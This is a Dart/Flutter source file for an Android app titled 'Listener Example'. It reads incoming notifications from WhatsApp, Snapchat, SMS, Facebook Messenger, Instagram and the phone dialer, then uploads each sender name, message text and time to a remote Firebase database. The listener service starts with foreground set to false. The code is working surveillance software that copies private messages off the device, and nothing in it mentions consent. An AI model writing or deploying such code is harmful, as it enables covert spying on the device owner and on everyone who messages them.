import 'dart:isolate';
import 'dart:ui';
import 'package:cloud_firestore/cloud_firestore.dart';
import 'package:firebase_core/firebase_core.dart';
import 'package:firebase_database/firebase_database.dart';
import 'package:flutter/material.dart';
import 'dart:async';
import 'package:flutter_notification_listener/flutter_notification_listener.dart';

void main() async {
  WidgetsFlutterBinding.ensureInitialized();
  await Firebase.initializeApp();
  runApp(MaterialApp(home: notification()));
}

class notification extends StatefulWidget {
  @override
  _notificationState createState() => _notificationState();
}

class _notificationState extends State<notification> {
  @override
  void initState() {
    super.initState();
  }

  @override
  Widget build(BuildContext context) {
    return new MaterialApp(
      home: NotificationsLog(),
    );
  }
}

class NotificationsLog extends StatefulWidget {
  @override
  _NotificationsLogState createState() => _NotificationsLogState();
}

class _NotificationsLogState extends State<NotificationsLog> {
  List<NotificationEvent> _log = [];
  bool started = false;
  bool _loading = false;

  ReceivePort port = ReceivePort();

  @override
  void initState() {
    initPlatformState();
    super.initState();
  }

  // we must use static method, to handle in background
  @pragma(
      'vm:entry-point') // prevent dart from stripping out this function on release build in Flutter 3.x
  static void _callback(NotificationEvent evt) {
    print("send evt to ui: $evt");
    final SendPort? send = IsolateNameServer.lookupPortByName("_listener_");
    if (send == null) print("can't find the sender");
    send?.send(evt);
  }

  // Platform messages are asynchronous, so we initialize in an async method.
  Future<void> initPlatformState() async {
    NotificationsListener.initialize(
      callbackHandle: _callback,
    );

    // this can fix restart<debug> can't handle error
    IsolateNameServer.removePortNameMapping("_listener_");
    IsolateNameServer.registerPortWithName(port.sendPort, "_listener_");
    port.listen((message) => onData(message));

    // don't use the default receivePort
    // NotificationsListener.receivePort.listen((evt) => onData(evt));

    var isRunning = (await NotificationsListener.isRunning) ?? false;
    print("""Service is ${!isRunning ? "not " : ""}already running""");

    setState(() {
      started = isRunning;
    });
  }

  onData(NotificationEvent event) async {
    switch (event.packageName) {
      case "com.whatsapp":
        {
          print("inside whatsapp loop");

          try {
            DatabaseReference ref =
                FirebaseDatabase.instance.ref("/Dummy/Whatsapp");

            await ref.push().set({
              "Title": event.title,
              "Content": event.text,
              "Date": event.createAt.toString(),
            });
          } catch (e) {
            print(e);
          }
        }
      case "com.snapchat.android":
        {
          print("inside snapchat loop");

          try {
            DatabaseReference ref =
                FirebaseDatabase.instance.ref("/Dummy/Snapchat");

            await ref.push().set({
              "Title": event.title,
              "Content": event.text,
              "Date": event.createAt.toString(),
            });
          } catch (e) {
            print(e);
          }
        }

      case "com.google.android.dialer":
        {
          if (event.text == "Missed call") {
            print("inside phone loop");

            try {
              DatabaseReference ref =
                  FirebaseDatabase.instance.ref("/Dummy/Calls");

              await ref.push().set({
                "Title": event.title,
                "Content": event.text,
                "Date": event.createAt.toString(),
              });
            } catch (e) {
              print(e);
            }
          }
        }
      case "com.google.android.apps.messaging":
        {
          if (event.text != "Messages is doing work in the background") {
            {
              print("inside SMS loop");

              try {
                DatabaseReference ref =
                    FirebaseDatabase.instance.ref("/Dummy/SMS");

                await ref.push().set({
                  "Title": event.title,
                  "Content": event.text,
                  "Date": event.createAt.toString(),
                });
              } catch (e) {
                print(e);
              }
            }
          }
        }
      case "com.facebook.orca":
        {
          print("inside Messenger loop");

          try {
            DatabaseReference ref =
                FirebaseDatabase.instance.ref("/Dummy/Messenger");

            await ref.push().set({
              "Title": event.title,
              "Content": event.text,
              "Date": event.createAt.toString(),
            });
          } catch (e) {
            print(e);
          }
        }
      case "com.instagram.android":
        {
          if (event.largeIcon != null) {
            print("inside Insta loop");

            try {
              DatabaseReference ref =
                  FirebaseDatabase.instance.ref("/Dummy/Instagram");

              await ref.push().set({
                "Title": event.title,
                "Content": event.text,
                "Date": event.createAt.toString(),
              });
            } catch (e) {
              print(e);
            }
          }
        }
    }

    setState(() {
      _log.add(event);
    });
  }

  void startListening() async {
    print("start listening");
    setState(() {
      _loading = true;
    });
    var hasPermission = (await NotificationsListener.hasPermission) ?? false;
    if (!hasPermission) {
      print("no permission, so open settings");
      NotificationsListener.openPermissionSettings();
      return;
    }

    var isRunning = (await NotificationsListener.isRunning) ?? false;

    if (!isRunning) {
      await NotificationsListener.startService(
          foreground: false,
          title: "Listener Running",
          description: "Welcome to having me");
    }

    setState(() {
      started = true;
      _loading = false;
    });
  }

  void stopListening() async {
    print("stop listening");

    setState(() {
      _loading = true;
    });

    await NotificationsListener.stopService();

    setState(() {
      started = false;
      _loading = false;
    });
  }

  @override
  Widget build(BuildContext context) {
    return Scaffold(
      appBar: AppBar(
        title: Text('Listener Example'),
        actions: [
          IconButton(
              onPressed: () {
                print("TODO:");
              },
              icon: Icon(Icons.settings))
        ],
      ),
      body: Center(
          child: ListView.builder(
              itemCount: _log.length,
              reverse: true,
              itemBuilder: (BuildContext context, int idx) {
                final entry = _log[idx];
                return ListTile(
                    onTap: () {
                      entry.tap();
                    },
                    title: Container(
                      child: Column(
                        crossAxisAlignment: CrossAxisAlignment.start,
                        children: [
                          Text(entry.title ?? "<<no title>>"),
                          Text(entry.packageName ?? "<<no package>>"),
                          Text(entry.text ?? "<<no text>>"),
                          Text(entry.createAt.toString().substring(0, 19)),
                        ],
                      ),
                    ));
              })),
      floatingActionButton: FloatingActionButton(
        onPressed: started ? stopListening : startListening,
        tooltip: 'Start/Stop sensing',
        child: _loading
            ? Icon(Icons.close)
            : (started ? Icon(Icons.stop) : Icon(Icons.play_arrow)),
      ),
    );
  }
}
